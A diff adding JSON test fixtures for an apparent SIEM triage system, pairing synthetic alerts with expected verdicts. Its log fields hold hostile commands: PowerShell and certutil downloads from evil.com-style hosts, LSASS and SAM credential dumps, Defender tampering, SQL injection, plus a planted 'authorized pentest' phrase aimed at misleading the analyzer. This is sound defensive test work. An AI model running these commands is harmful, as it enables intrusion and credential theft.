@@ -1,0 +1,701 @@
+[
+  {
+    "id": "RT001_TIMING_001",
+    "name": "Slowloris-style log padding",
+    "description": "Alert with extremely large raw_log designed to slow regex processing",
+    "category": "performance",
+    "task_type": "brute_force",
+    "siem_event": {
+      "title": "Multiple Failed Logins",
+      "source_ip": "185.220.101.45",
+      "username": "admin",
+      "rule_name": "BruteForce",
+      "raw_log": "FAILED LOGIN attempt from 185.220.101.45 for user admin. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Failed password. Attempt 1 of 500."
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 70,
+    "investigation_plan": "brute_force"
+  },
+  {
+    "id": "RT001_TIMING_002",
+    "name": "Unicode homoglyph metadata poisoning",
+    "description": "Alert with Cyrillic homoglyphs in rule_name to test Unicode normalization",
+    "category": "encoding",
+    "task_type": "phishing_investigation",
+    "siem_event": {
+      "title": "Suspicious Email Detected",
+      "source_ip": "203.0.113.50",
+      "username": "user1",
+      "rule_name": "Ph\u0456shing",
+      "raw_log": "From: attacker@evil.com To: victim@company.com Subject: Urgent! Click http://evil-site.com/login"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 75,
+    "investigation_plan": "phishing_investigation"
+  },
+  {
+    "id": "RT001_TIMING_003",
+    "name": "Nested encoding attack",
+    "description": "Base64-encoded attack indicators requiring multiple decoding passes",
+    "category": "encoding",
+    "task_type": "c2_communication_hunt",
+    "siem_event": {
+      "title": "Beacon Detected",
+      "source_ip": "10.0.0.55",
+      "username": "svc_account",
+      "rule_name": "C2Beacon",
+      "raw_log": "Connection to Z292ZXJubWVudC1zZWN1cml0eS5jb20= every 60s. User-Agent: TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCk="
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 80,
+    "investigation_plan": "c2_communication_hunt"
+  },
+  {
+    "id": "RT001_TIMING_004",
+    "name": "Benign metadata with attack content",
+    "description": "Alert classified as benign_system_event but with attack indicators in raw_log",
+    "category": "classification_evasion",
+    "task_type": "benign_system_event",
+    "siem_event": {
+      "title": "Scheduled Maintenance",
+      "source_ip": "10.0.0.1",
+      "username": "system",
+      "rule_name": "windows_update",
+      "raw_log": "Windows Update completed successfully. Also: DROP TABLE users; SELECT * FROM passwords; --"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 60,
+    "investigation_plan": "privilege_escalation_hunt"
+  },
+  {
+    "id": "RT001_TIMING_005",
+    "name": "Path traversal in Windows event fields",
+    "description": "Windows-style path traversal in event fields that might bypass Unix-centric detection",
+    "category": "path_traversal",
+    "task_type": "lateral_movement_detection",
+    "siem_event": {
+      "title": "Admin Share Access",
+      "source_ip": "192.168.1.100",
+      "username": "DOMAIN\\admin",
+      "rule_name": "LateralMovement",
+      "raw_log": "User DOMAIN\\admin accessed \\\\DC01\\ADMIN$\\..\\..\\windows\\system32\\config\\sam. PsExec.exe executed."
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 75,
+    "investigation_plan": "lateral_movement_detection"
+  },
+  {
+    "id": "RT001_TIMING_006",
+    "name": "SQL injection in Kerberos event",
+    "description": "Cross-category attack: SQLi payload embedded in Kerberos authentication event",
+    "category": "cross_vector",
+    "task_type": "kerberoasting",
+    "siem_event": {
+      "title": "TGS Ticket Request",
+      "source_ip": "10.0.0.42",
+      "username": "svc_sql' OR '1'='1",
+      "rule_name": "Kerberoasting",
+      "raw_log": "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc' UNION SELECT * FROM sensitive_data-- TargetUserName=svc_sql' OR '1'='1"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 85,
+    "investigation_plan": "kerberoasting"
+  },
+  {
+    "id": "RT001_TIMING_007",
+    "name": "Zero-width character injection",
+    "description": "Alert with zero-width Unicode characters to test sanitizer",
+    "category": "encoding",
+    "task_type": "data_exfiltration_detection",
+    "siem_event": {
+      "title": "Large Data Transfer",
+      "source_ip": "10.0.0.99",
+      "username": "\u200buser\u200b",
+      "rule_name": "DataExfil",
+      "raw_log": "User \u200badmin\u200b uploaded 5GB to https://attacker.com/\u200bexfil. File: customer_data.csv"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 70,
+    "investigation_plan": "data_exfiltration_detection"
+  },
+  {
+    "id": "RT001_TIMING_008",
+    "name": "Case variation attack indicators",
+    "description": "Mixed-case attack indicators that might bypass case-sensitive detection",
+    "category": "case_sensitivity",
+    "task_type": "ransomware_triage",
+    "siem_event": {
+      "title": "Suspicious Process Execution",
+      "source_ip": "10.0.0.77",
+      "username": "john.doe",
+      "rule_name": "Ransomware",
+      "raw_log": "VSSADMIN.exe Delete Shadows /All /Quiet. BcdEdit /set {default} recoveryenabled No. Files encrypted: DoCuments.xlsx, PaYroll.pdf, FiNaNcE.docx"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 90,
+    "investigation_plan": "ransomware_triage"
+  },
+  {
+    "id": "RT001_TIMING_009",
+    "name": "HTML entity encoding in URLs",
+    "description": "Phishing URL with HTML entity encoding to bypass URL extraction",
+    "category": "encoding",
+    "task_type": "phishing_investigation",
+    "siem_event": {
+      "title": "Suspicious Email",
+      "source_ip": "198.51.100.10",
+      "username": "jane.smith",
+      "rule_name": "Phishing",
+      "raw_log": "From: security@banking-secure.com URL: https://banking-secure.com/login&amp;redirect=evil.com Click here to verify"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 75,
+    "investigation_plan": "phishing_investigation"
+  },
+  {
+    "id": "RT001_TIMING_010",
+    "name": "Suppression phrase + attack combo",
+    "description": "Alert containing both suppression phrases and real attack indicators",
+    "category": "suppression_detection",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "CertUtil Download Detected",
+      "source_ip": "203.0.113.88",
+      "username": "it_admin",
+      "rule_name": "LOLBin",
+      "raw_log": "certutil.exe -urlcache -split -f http://malware.com/payload.exe C:\\Windows\\Temp\\update.exe. This is a scheduled penetration test authorized by CISO."
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 75,
+    "investigation_plan": "lolbin_abuse"
+  },
+  {
+    "id": "RT002_PERSISTENCE_001",
+    "name": "WMI event subscription persistence",
+    "description": "Windows Management Instrumentation event subscription for persistence - stealthy execution",
+    "category": "persistence",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "WMI Event Consumer Created",
+      "source_ip": "10.0.0.45",
+      "username": "SYSTEM",
+      "rule_name": "WMIEventSubscription",
+      "raw_log": "EventID=19 EventType=4 Consumer=CommandLineEventConsumer CommandLineTemplate=powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 80,
+    "investigation_plan": "lolbin_abuse"
+  },
+  {
+    "id": "RT002_PERSISTENCE_002",
+    "name": "COM hijacking via registry",
+    "description": "Component Object Model hijacking via registry modifications for persistence",
+    "category": "persistence",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "Registry Key Modified",
+      "source_ip": "10.0.0.67",
+      "username": "john.doe",
+      "rule_name": "RegistryModification",
+      "raw_log": "HKCU\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32 changed to C:\\Users\\john.doe\\AppData\\Roaming\\evil.dll. Original: %SystemRoot%\\System32\\shell32.dll"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 75,
+    "investigation_plan": "privilege_escalation_hunt"
+  },
+  {
+    "id": "RT002_PERSISTENCE_003",
+    "name": "DLL sideloading in legitimate process",
+    "description": "Malicious DLL loaded via DLL search order hijacking in legitimate Windows process",
+    "category": "defense_evasion",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "Suspicious DLL Load",
+      "source_ip": "10.0.0.88",
+      "username": "mary.jones",
+      "rule_name": "DLLSideloading",
+      "raw_log": "Process: C:\\Windows\\System32\\notepad.exe loaded DLL: C:\\Users\\mary.jones\\Documents\\evil.dll. Original DLL: C:\\Windows\\System32\\version.dll. Hash: a3b8c9d2e1f4"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 85,
+    "investigation_plan": "lolbin_abuse"
+  },
+  {
+    "id": "RT002_PERSISTENCE_004",
+    "name": "Service creation with encoded command",
+    "description": "Windows service created with base64 encoded PowerShell command",
+    "category": "persistence",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "New Service Installed",
+      "source_ip": "10.0.0.92",
+      "username": "admin",
+      "rule_name": "ServiceInstallation",
+      "raw_log": "EventID=7045 ServiceName=UpdateService ServiceType=user mode service StartType=auto ServiceAccount=LocalSystem ImagePath=powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA=="
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 80,
+    "investigation_plan": "privilege_escalation_hunt"
+  },
+  {
+    "id": "RT002_PERSISTENCE_005",
+    "name": "LSASS memory access via procdump",
+    "description": "Credential dumping via legitimate Sysinternals tool (living off the land)",
+    "category": "credential_access",
+    "task_type": "kerberoasting",
+    "siem_event": {
+      "title": "Process Access LSASS",
+      "source_ip": "10.0.0.101",
+      "username": "admin",
+      "rule_name": "LSASSAccess",
+      "raw_log": "Process: procdump.exe (PID 4521) accessed lsass.exe (PID 688) with rights 0x1010. CommandLine: procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 85,
+    "investigation_plan": "kerberoasting"
+  },
+  {
+    "id": "RT002_PERSISTENCE_006",
+    "name": "BITS job for persistence",
+    "description": "Background Intelligent Transfer Service used to download payload and maintain persistence",
+    "category": "persistence",
+    "task_type": "c2_communication_hunt",
+    "siem_event": {
+      "title": "BITS Job Created",
+      "source_ip": "10.0.0.115",
+      "username": "svc_backup",
+      "rule_name": "BITSActivity",
+      "raw_log": "EventID=60 BITS job created: Name=SystemUpdate JobId={12345678-1234-1234-1234-123456789012} Owner=svc_backup Files=1 URL=http://185.220.101.77/payload.exe LocalFile=C:\\Windows\\Temp\\svchost.exe"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 75,
+    "investigation_plan": "c2_communication_hunt"
+  },
+  {
+    "id": "RT002_PERSISTENCE_007",
+    "name": "Scheduled task with hidden attribute",
+    "description": "Scheduled task created with hidden attribute to evade detection",
+    "category": "persistence",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "Scheduled Task Created",
+      "source_ip": "10.0.0.123",
+      "username": "admin",
+      "rule_name": "ScheduledTask",
+      "raw_log": "EventID=4698 TaskName=\\Microsoft\\Windows\\Maintenance\\SystemUpdate TaskContent=<?xml version=\"1.0\"?><Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')</Arguments></Exec></Actions></Task>"
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 80,
+    "investigation_plan": "lolbin_abuse"
+  },
+  {
+    "id": "RT002_PERSISTENCE_008",
+    "name": "Token impersonation via RunAs",
+    "description": "Privilege escalation via token impersonation using RunAs with saved credentials",
+    "category": "privilege_escalation",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "Process Created with Different Token",
+      "source_ip": "10.0.0.134",
+      "username": "limited.user",
+      "rule_name": "TokenImpersonation",
+      "raw_log": "EventID=4688 Process: runas.exe CommandLine: runas /savecred /user:DOMAIN\\admin \"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=\""
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 85,
+    "investigation_plan": "privilege_escalation_hunt"
+  },
+  {
+    "id": "RT002_PERSISTENCE_009",
+    "name": "AppCert DLLs for persistence",
+    "description": "AppCert DLLs registry modification for application initialization persistence",
+    "category": "persistence",
+    "task_type": "privilege_escalation_hunt",
+    "siem_event": {
+      "title": "Registry Key Modified",
+      "source_ip": "10.0.0.142",
+      "username": "admin",
+      "rule_name": "RegistryModification",
+      "raw_log": "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\\Default changed to C:\\Windows\\ evil.dll. Any process loading WinAPI CreateProcess/CreateProcessAsUser will load this DLL."
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 85,
+    "investigation_plan": "privilege_escalation_hunt"
+  },
+  {
+    "id": "RT002_PERSISTENCE_010",
+    "name": "Netsh helper DLL persistence",
+    "description": "Netsh helper DLL registration for persistent command execution",
+    "category": "persistence",
+    "task_type": "lolbin_abuse",
+    "siem_event": {
+      "title": "Netsh Helper DLL Registered",
+      "source_ip": "10.0.0.155",
+      "username": "admin",
+      "rule_name": "NetshHelper",
+      "raw_log": "Process: netsh.exe CommandLine: netsh add helper C:\\Users\\public\\documents\\helper.dll. EventID=4688. The DLL will be loaded every time netsh.exe executes."
+    },
+    "expected_verdict": "true_positive",
+    "expected_risk_min": 80,
+    "investigation_plan": "lolbin_abuse"
+  },
+  {
+    "id": "CVE-2024-001",
+    "name": "Windows Installer Elevation",
+    "description": "Exploits Windows Installer vulnerability for SYSTEM privilege escalation",
+    "tactic": "privilege_escalation",
+    "technique": "T1068",
+    "payload": {
+      "task_type": "privilege_escalation_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "msiexec.exe /i C:\\\\Users\\\\Public\\\\payload.msi /quiet /qn",
+        "source_ip": "10.0.0.15",
+        "username": "standard_user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "PERSIST-001",
+    "name": "Time Provider DLL Hijacking",
+    "description": "Malicious time provider DLL for persistence",
+    "tactic": "persistence",
+    "technique": "T1547",
+    "payload": {
+      "task_type": "persistence_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders modified",
+        "source_ip": "10.0.0.20",
+        "username": "SYSTEM"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "LATERAL-001",
+    "name": "WMI Event Subscription Remote",
+    "description": "WMI event subscription for lateral movement",
+    "tactic": "lateral_movement",
+    "technique": "T1021",
+    "payload": {
+      "task_type": "lateral_movement_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "wmic /node:10.0.0.50 process call create powershell",
+        "source_ip": "10.0.0.25",
+        "destination_ip": "10.0.0.50"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "DEFENSE-001",
+    "name": "Tamper Windows Defender",
+    "description": "Attempts to disable or tamper with Defender",
+    "tactic": "defense_evasion",
+    "technique": "T1562",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "MpCmdRun.exe -RemoveDefinitions -All",
+        "source_ip": "10.0.0.30",
+        "username": "admin"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "CRED-001",
+    "name": "LSASS Memory Dump via comsvcs",
+    "description": "Uses comsvcs.dll to dump LSASS memory",
+    "tactic": "credential_access",
+    "technique": "T1003",
+    "payload": {
+      "task_type": "credential_access_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "rundll32.exe comsvcs.dll, MiniDump 708 C:\\\\temp\\\\lsass.dmp full",
+        "source_ip": "10.0.0.35",
+        "username": "SYSTEM"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 90
+  },
+  {
+    "id": "BYPASS-001",
+    "name": "AMSI Bypass via Reflection",
+    "description": "In-memory AMSI bypass using reflection",
+    "tactic": "defense_evasion",
+    "technique": "T1562",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "[Ref].Assembly.GetTypes() | Where-Object { $_ -like '*iUtils' }",
+        "source_ip": "10.0.0.40"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "T1055-001",
+    "name": "Process Injection via CreateRemoteThread",
+    "description": "Injects malicious code into legitimate process using CreateRemoteThread",
+    "tactic": "defense_evasion",
+    "technique": "T1055",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "CreateRemoteThread called from pid=1234 targeting pid=5678 (notepad.exe) with start address in VirtualAllocEx allocation",
+        "source_ip": "10.0.0.70",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "T1059-001",
+    "name": "PowerShell Empire Agent",
+    "description": "PowerShell Empire framework agent beaconing",
+    "tactic": "execution",
+    "technique": "T1059.001",
+    "payload": {
+      "task_type": "execution_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "powershell.exe -nop -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAGEAZwBlAG4AdAAuAHAAcwAxACcAKQA=",
+        "source_ip": "10.0.0.71",
+        "username": "svc_account"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 90
+  },
+  {
+    "id": "T1071-001",
+    "name": "DNS Tunneling Data Exfil",
+    "description": "Exfiltrates data via DNS queries to malicious domain",
+    "tactic": "command_and_control",
+    "technique": "T1071.004",
+    "payload": {
+      "task_type": "c2_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "DNS query for aGVsbG8ud29ybGQ=.evil-domain.com type=A from 10.0.0.72",
+        "source_ip": "10.0.0.72",
+        "destination_ip": "8.8.8.8"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "T1496-001",
+    "name": "Cryptojacking via XMRig",
+    "description": "Unauthorized cryptocurrency mining using XMRig",
+    "tactic": "impact",
+    "technique": "T1496",
+    "payload": {
+      "task_type": "impact_detection",
+      "severity": "medium",
+      "siem_event": {
+        "raw_log": "xmrig.exe -o pool.minexmr.com:4444 -u 44MnN1f3F... --donate-level=1 --max-cpu-usage=80",
+        "source_ip": "10.0.0.73",
+        "username": "SYSTEM"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "T1567-001",
+    "name": "Exfiltration to Mega.nz",
+    "description": "Data exfiltration using Mega.nz cloud storage",
+    "tactic": "exfiltration",
+    "technique": "T1567.002",
+    "payload": {
+      "task_type": "data_exfil_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "megatool.exe upload --username attacker@tempmail.com --password temp123! C:\\data\\sensitive.pdf",
+        "source_ip": "10.0.0.74",
+        "destination_ip": "89.44.169.136"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "T1003-002",
+    "name": "SAM Database Dump via Reg.exe",
+    "description": "Dumps SAM database using reg.exe for offline credential cracking",
+    "tactic": "credential_access",
+    "technique": "T1003.002",
+    "payload": {
+      "task_type": "credential_access_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "reg.exe save HKLM\\SAM C:\\temp\\sam.save /y",
+        "source_ip": "10.0.0.75",
+        "username": "admin"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 90
+  },
+  {
+    "id": "T1548-001",
+    "name": "Bypass UAC via Event Viewer",
+    "description": "Uses Event Viewer to bypass UAC and gain elevated privileges",
+    "tactic": "privilege_escalation",
+    "technique": "T1548.002",
+    "payload": {
+      "task_type": "privilege_escalation_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "eventvwr.exe launching powershell.exe with elevated privileges via registry hijack",
+        "source_ip": "10.0.0.80",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "T1036-001",
+    "name": "Masquerading as Legitimate Process",
+    "description": "Renames malware to appear as legitimate Windows process",
+    "tactic": "defense_evasion",
+    "technique": "T1036",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "medium",
+      "siem_event": {
+        "raw_log": "svchost.exe executing from C:\\Users\\Public\\svchost.exe (not System32)",
+        "source_ip": "10.0.0.81",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "T1021-002",
+    "name": "SMB/Windows Admin Shares",
+    "description": "Uses SMB admin shares for lateral movement",
+    "tactic": "lateral_movement",
+    "technique": "T1021.002",
+    "payload": {
+      "task_type": "lateral_movement_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "net use \\10.0.0.82\\ADMIN$ /user:DOMAIN\\admin P@ssw0rd!",
+        "source_ip": "10.0.0.83",
+        "destination_ip": "10.0.0.82"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "T1218-001",
+    "name": "Signed Binary Proxy Execution - CMSTP",
+    "description": "Uses CMSTP.exe to execute malicious code via INF file",
+    "tactic": "defense_evasion",
+    "technique": "T1218.003",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "cmstp.exe /s C:\\temp\\malicious.inf",
+        "source_ip": "10.0.0.84",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 80
+  },
+  {
+    "id": "T1105-001",
+    "name": "Ingress Tool Transfer via CertUtil",
+    "description": "Downloads tools using certutil.exe download capability",
+    "tactic": "command_and_control",
+    "technique": "T1105",
+    "payload": {
+      "task_type": "c2_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "certutil.exe -urlcache -split -f https://evil.com/mimikatz.exe C:\\temp\\m.exe",
+        "source_ip": "10.0.0.85",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "T1053-005",
+    "name": "Scheduled Task/Job - At",
+    "description": "Creates scheduled task using at.exe for persistence",
+    "tactic": "persistence",
+    "technique": "T1053.002",
+    "payload": {
+      "task_type": "persistence_detection",
+      "severity": "medium",
+      "siem_event": {
+        "raw_log": "at.exe 23:00 /every:M,T,W,Th,F C:\\temp\\backdoor.exe",
+        "source_ip": "10.0.0.86",
+        "username": "admin"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 65
+  },
+  {
+    "id": "T1087-001",
+    "name": "Account Discovery - Local Accounts",
+    "description": "Enumerates local user accounts using net.exe",
+    "tactic": "discovery",
+    "technique": "T1087.001",
+    "payload": {
+      "task_type": "discovery_detection",
+      "severity": "low",
+      "siem_event": {
+        "raw_log": "net.exe user && net.exe localgroup administrators",
+        "source_ip": "10.0.0.87",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 50
+  },
+  {
+    "id": "T1486-001",
+    "name": "Data Encrypted for Impact",
+    "description": "Ransomware encrypts files and drops ransom note",
+    "tactic": "impact",
+    "technique": "T1486",
+    "payload": {
+      "task_type": "ransomware_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "README_DECRYPT.txt created: Your files have been encrypted. Pay 2 BTC to wallet...",
+        "source_ip": "10.0.0.88",
+        "username": "SYSTEM"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 95
+  }
+]
